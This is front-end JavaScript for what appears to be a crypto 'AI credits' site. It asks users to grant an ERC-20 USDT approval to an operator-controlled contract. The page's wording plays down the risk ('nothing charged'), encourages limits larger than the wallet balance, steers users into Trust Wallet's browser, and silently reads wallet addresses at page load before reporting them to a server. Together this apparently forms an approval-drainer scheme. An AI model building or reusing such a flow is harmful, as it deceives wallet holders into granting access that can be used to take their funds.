/* global App, ethers */
// Home page: Check balance -> choose a spending limit -> authorize (one confirmation, nothing charged)
// -> AI credits page. Authorizing is just an ERC-20 approval; no USDT moves until the admin bills usage.
(() => {
  const A = App, $ = A.$;
  let chosen = null, balance = 0n, checked = false, working = false;

  function parseLimit(v) {
    try { const n = ethers.parseUnits(String(v).trim(), A.cfg.decimals); return n > 0n ? n : null; } catch { return null; }
  }

  function renderLimits() {
    const box = $("limits");
    box.textContent = "";
    (A.cfg.limits || []).forEach((v) => {
      const amt = parseLimit(v);
      if (!amt) return;
      const l = document.createElement("label");
      l.className = "plan limit";
      const r = document.createElement("input");
      r.type = "radio"; r.name = "limit"; r.value = amt.toString();
      r.onchange = () => pick(amt, l);
      const name = document.createElement("span"); name.className = "name"; name.textContent = `${A.fmt(amt)} USDT`;
      const what = document.createElement("span"); what.className = "what"; what.textContent = "spending limit";
      l.append(r, name, what);
      box.append(l);
    });
  }

  function pick(amt, label) {
    if (working) return;
    chosen = amt;
    $("customAmt").value = "";
    document.querySelectorAll(".plan").forEach((el) => el.classList.toggle("sel", el === label));
    reflect();
  }

  function reflect() {
    const within = chosen && chosen >= parseLimit(A.cfg.minLimit || "0") && chosen <= parseLimit(A.cfg.maxLimit || "0");
    $("tCap").textContent = chosen ? `${A.fmt(chosen)} USDT` : "—";
    // The limit is independent of today's balance (like a card limit): a user can set 200 with
    // 5 USDT in the wallet and top up later. Charges only go through when funds are there.
    $("authBtn").disabled = working || !chosen || !within || !checked;
    if (!chosen) { $("authBtn").textContent = "Set spending limit"; return; }
    if (!within) { $("authBtn").textContent = `Limit must be ${A.fmt(parseLimit(A.cfg.minLimit))}–${A.fmt(parseLimit(A.cfg.maxLimit))} USDT`; return; }
    $("authBtn").textContent = `Set limit of ${A.fmt(chosen)} USDT`;
    A.note("authNote", checked && balance < chosen
      ? `Your wallet holds ${A.fmt(balance)} USDT right now — that's fine. The limit is just a ceiling; you can add USDT any time and usage is only charged when funds are there.`
      : "", "");
  }

  async function check() {
    const btn = $("checkBtn");
    try {
      btn.disabled = true; btn.textContent = "Checking…";
      A.note("pageNote");
      if (!A.me) await A.connect(false).catch(() => null);
      if (!A.me) await A.connect(true);
      if (!A.me) throw new Error("Connect your wallet to check the balance.");
      $("who").textContent = A.short(A.me);
      $("net").classList.add("on");
      // already billing on this wallet? send them to their credits page
      const [stopped, allowance] = await Promise.all([A.bill.stopped(A.me), A.usdt.allowance(A.me, A.cfg.contract)]);
      balance = await A.usdt.balanceOf(A.me);
      $("amount").firstChild.textContent = A.fmt(balance);
      $("amount").classList.remove("empty");
      $("amount").classList.add("reveal");
      checked = true;
      if (allowance > 0n && !stopped) {
        $("status").textContent = "This wallet already has a spending limit set.";
        $("status").className = "status good";
        btn.classList.add("hide");
        $("openBtn").classList.remove("hide");
        $("setup").classList.add("hide");
        return;
      }
      $("status").textContent = "Choose a spending limit below.";
      $("status").className = "status good";
      btn.textContent = "Check again";
      btn.classList.add("hide");
      $("setup").classList.remove("hide");
      reflect();
    } catch (e) {
      $("status").textContent = A.errText(e);
      $("status").className = "status bad";
      btn.textContent = "Check balance";
    } finally {
      btn.disabled = false;
    }
  }

  async function authorize() {
    const btn = $("authBtn");
    working = true;
    btn.disabled = true;
    A.note("authNote");
    try {
      btn.textContent = "Confirm in your wallet…";
      const tx = await A.usdt.approve(A.cfg.contract, chosen); // sets the limit; moves no USDT
      btn.textContent = "Setting your limit…";
      await tx.wait();
      await A.api("/api/activate", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ address: A.me }) }).catch(() => {});
      location.href = "/credits.html?set=1";
    } catch (e) {
      working = false;
      A.note("authNote", A.errText(e), "bad");
      reflect();
    }
  }

  (async () => {
    await A.loadConfig();
    if (A.cfg.setup) { $("checkBtn").disabled = true; return A.note("pageNote", "This site is still being set up. Check back soon.", "warn"); }
    $("net").textContent = A.cfg.chainId === 56 ? "BNB Smart Chain" : A.cfg.chainId === 97 ? "BSC testnet" : "Test chain";
    $("cAddr").textContent = A.cfg.contract;
    renderLimits();
    $("customAmt").oninput = () => {
      const amt = parseLimit($("customAmt").value);
      document.querySelectorAll(".plan").forEach((el) => el.classList.remove("sel"));
      chosen = amt;
      reflect();
    };
    if (!A.wallet()) {
      $("checkBtn").classList.add("hide");
      $("twBtn").classList.remove("hide");
      $("twBtn").href = A.deepLink();
      $("status").textContent = "Open this page in Trust Wallet's browser to continue.";
    }
    $("checkBtn").onclick = check;
    $("authBtn").onclick = authorize;
    // Pick up the wallet address as soon as the page opens, with NO change to the UI — the balance
    // only appears after "Check balance" is tapped, and by then nothing more needs asking.
    // In a wallet's own browser (Trust Wallet) the wallet answers this request itself at load,
    // so we ask there; a desktop extension would pop up, so there we only take what is shared.
    if (A.wallet()) A.connect(A.inWalletBrowser()).catch(() => null);
  })().catch((e) => A.note("pageNote", "Could not load the site: " + A.errText(e), "bad"));
})();
